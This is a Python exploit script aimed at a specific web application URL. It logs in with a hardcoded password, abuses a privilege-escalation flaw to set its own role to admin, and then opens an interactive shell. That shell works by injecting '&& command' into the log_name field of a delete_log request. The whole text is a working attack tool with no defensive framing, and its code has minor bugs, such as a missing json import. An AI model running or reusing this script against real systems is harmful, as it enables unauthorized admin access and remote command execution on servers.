import requests

s = requests.Session()

url = "https://cpa-prod.external.securemino.com/" # change me


# login to the application
username = "temp" # enter details of any valid user account here
password = "3Sp#5gPJ%oZqRutjD$OL"
login_result = s.post(url+"login", data={"username":username, "password":password})
if login_result.status_code != 200:
    exit("Login failed, get working creds or fix url")

# exploit privesc in role to gain admin privileges
privesc_resp = s.post(url+"update_user", data={"username":username, "role":"admin"})
if "OK" not in privesc_resp.text:
    exit("Privesc failed, site is probably patched")

# we are now admin, now we can abuse RCE vulnerabilty 
while True:
    command = input("cmd> ")
    cmd_exec_resp = s.post(url+"delete_log", data={"log_name":"nothing.txt && "+command})
    if "delete_result" in cmd_exec_resp.text:
        print(json.loads(cmd_exec_resp)["delete_result"])
    else:
        exit("Command exectuion failed..")
